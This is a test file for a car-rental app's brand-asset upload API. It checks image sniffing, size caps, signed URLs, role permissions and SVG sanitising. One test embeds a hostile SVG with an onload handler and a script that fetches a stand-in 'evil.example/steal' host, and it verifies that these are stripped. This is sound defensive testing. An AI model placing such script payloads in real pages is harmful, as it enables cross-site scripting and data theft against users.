import { deflateSync } from 'node:zlib';

import { zBrandingResponse } from '@carrental/contracts';
import { DEFAULT_BRAND_CONFIG } from '@carrental/theme';
import request from 'supertest';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { getTestApp, httpServer, closeTestApp } from './helpers/app';
import { signIn } from './helpers/auth';

/**
 * STAGE-009 — brand-asset upload (DEC-025). `POST /api/v1/config/branding/assets` takes a
 * base64 image, sniffs the real media type, caps size + dimensions, sanitises SVG, stores it via
 * the fs `ObjectStoragePort`, and returns an `obj:` ref + a signed preview URL. The ref is
 * resolved to a signed `/api/v1/assets/…` URL in `GET /api/v1/meta/branding`.
 */

/** Minimal but byte-valid opaque PNG of the given size (IHDR + one IDAT + IEND, CRC32'd). */
function makePng(width: number, height: number): Buffer {
  const crcTable: number[] = [];
  for (let n = 0; n < 256; n++) {
    let c = n;
    for (let k = 0; k < 8; k++) c = c & 1 ? 0xedb88320 ^ (c >>> 1) : c >>> 1;
    crcTable[n] = c >>> 0;
  }
  const crc32 = (buf: Buffer) => {
    let c = 0xffffffff;
    for (const b of buf) c = crcTable[(c ^ b) & 0xff]! ^ (c >>> 8);
    return (c ^ 0xffffffff) >>> 0;
  };
  const chunk = (type: string, data: Buffer) => {
    const typeBuf = Buffer.from(type, 'ascii');
    const len = Buffer.alloc(4);
    len.writeUInt32BE(data.length);
    const crc = Buffer.alloc(4);
    crc.writeUInt32BE(crc32(Buffer.concat([typeBuf, data])));
    return Buffer.concat([len, typeBuf, data, crc]);
  };
  const ihdr = Buffer.alloc(13);
  ihdr.writeUInt32BE(width, 0);
  ihdr.writeUInt32BE(height, 4);
  ihdr[8] = 8; // bit depth
  ihdr[9] = 2; // colour type: truecolour
  // one filter byte + RGB per pixel per row
  const raw = Buffer.alloc(height * (1 + width * 3));
  const idat = deflateSync(raw);
  return Buffer.concat([
    Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
    chunk('IHDR', ihdr),
    chunk('IDAT', idat),
    chunk('IEND', Buffer.alloc(0)),
  ]);
}

describe('brand-asset upload', () => {
  let server: ReturnType<typeof httpServer>;
  let adminToken: string;
  let managerToken: string;
  let agentToken: string;

  beforeAll(async () => {
    const app = await getTestApp();
    server = httpServer(app);
    adminToken = (await signIn(app, 'test-admin@example.test', 'Test-Passw0rd!', 'staff'))
      .accessToken;
    managerToken = (await signIn(app, 'test-manager@example.test', 'Test-Passw0rd!', 'staff'))
      .accessToken;
    agentToken = (await signIn(app, 'test-agent@example.test', 'Test-Passw0rd!', 'staff'))
      .accessToken;
  });
  afterAll(closeTestApp);

  const upload = (token: string, body: object) =>
    request(server)
      .post('/api/v1/config/branding/assets')
      .set('Authorization', `Bearer ${token}`)
      .send(body);

  it('uploads a PNG logo → obj: ref + signed URL that serves the bytes', async () => {
    const png = makePng(64, 64);
    const res = await upload(adminToken, {
      purpose: 'logo',
      mediaType: 'image/png',
      dataBase64: png.toString('base64'),
    }).expect(201);

    expect(res.body.ref).toMatch(/^obj:brand_logo\//);
    expect(res.body.mediaType).toBe('image/png');
    expect(res.body.width).toBe(64);
    expect(res.body.height).toBe(64);
    expect(res.body.url).toMatch(/^\/api\/v1\/assets\/brand_logo\/.+\?exp=\d+&sig=/);

    const asset = await request(server).get(res.body.url).expect(200);
    expect(asset.headers['content-type']).toContain('image/png');
    expect(Buffer.from(asset.body).equals(png)).toBe(true);
  });

  it('a tampered signature is rejected (404)', async () => {
    const png = makePng(32, 32);
    const res = await upload(adminToken, {
      purpose: 'favicon',
      mediaType: 'image/png',
      dataBase64: png.toString('base64'),
    }).expect(201);
    await request(server)
      .get(res.body.url.replace(/sig=.+$/, 'sig=deadbeef'))
      .expect(404);
  });

  it('rejects bytes that do not match the declared media type', async () => {
    await upload(adminToken, {
      purpose: 'logo',
      mediaType: 'image/png',
      dataBase64: Buffer.from('this is definitely not a png').toString('base64'),
    }).expect(422);
  });

  it('rejects a favicon whose dimensions exceed the cap', async () => {
    const tooBig = makePng(600, 600); // favicon maxPx is 512
    await upload(adminToken, {
      purpose: 'favicon',
      mediaType: 'image/png',
      dataBase64: tooBig.toString('base64'),
    }).expect(422);
  });

  it('rejects a payload over the byte cap', async () => {
    // incompressible noise so deflate can't shrink it under the 512 KB logo cap
    const noise = Buffer.alloc(700 * 1024);
    for (let i = 0; i < noise.length; i++) noise[i] = (i * 2654435761) & 0xff;
    const png = Buffer.concat([makePng(64, 64), noise]); // still sniffs as PNG (header first)
    await upload(adminToken, {
      purpose: 'logo',
      mediaType: 'image/png',
      dataBase64: png.toString('base64'),
    }).expect(422);
  });

  it('sanitises SVG — strips <script>, on* handlers, and external references', async () => {
    const dirty = `<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" onload="alert(1)">
      <script>fetch('https://evil.example/steal')</script>
      <image href="https://evil.example/x.png" x="0" y="0" width="10" height="10"/>
      <rect width="48" height="48" fill="#0a0"/>
    </svg>`;
    const res = await upload(adminToken, {
      purpose: 'logo',
      mediaType: 'image/svg+xml',
      dataBase64: Buffer.from(dirty).toString('base64'),
    }).expect(201);

    const asset = await request(server).get(res.body.url).expect(200);
    const svg = Buffer.from(asset.body).toString('utf8');
    expect(svg).not.toMatch(/<script/i);
    expect(svg).not.toMatch(/onload/i);
    expect(svg).not.toMatch(/evil\.example/);
    expect(svg).toMatch(/<rect/); // legitimate content survives
    expect(asset.headers['content-security-policy']).toContain("default-src 'none'");
  });

  it('a rental agent (no config.publish) cannot upload', async () => {
    await upload(agentToken, {
      purpose: 'logo',
      mediaType: 'image/png',
      dataBase64: makePng(32, 32).toString('base64'),
    }).expect(403);
  });

  it('GET /meta/branding resolves an obj: asset ref to a signed URL', async () => {
    const png = makePng(96, 96);
    const up = await upload(adminToken, {
      purpose: 'logo',
      mediaType: 'image/png',
      dataBase64: png.toString('base64'),
    }).expect(201);

    const cfg = structuredClone(DEFAULT_BRAND_CONFIG);
    cfg.assets.logo = up.body.ref; // obj:brand_logo/...

    const drafted = await request(server)
      .post('/api/v1/ops/config/versions')
      .set('Authorization', `Bearer ${adminToken}`)
      .send({ kind: 'branding', key: 'default', payload: cfg })
      .expect(201);
    await request(server)
      .post(`/api/v1/ops/config/versions/${drafted.body.id}/submit`)
      .set('Authorization', `Bearer ${adminToken}`)
      .expect(201);
    await request(server)
      .post(`/api/v1/ops/config/versions/${drafted.body.id}/approve`)
      .set('Authorization', `Bearer ${managerToken}`)
      .send({})
      .expect(201);

    const pub = await request(server).get('/api/v1/meta/branding').expect(200);
    const parsed = zBrandingResponse.parse(pub.body);
    expect(parsed.config.assets.logo).toMatch(/^\/api\/v1\/assets\/brand_logo\/.+\?exp=\d+&sig=/);
    // and the resolved URL actually serves the image
    await request(server).get(parsed.config.assets.logo!).expect(200);
  });
});
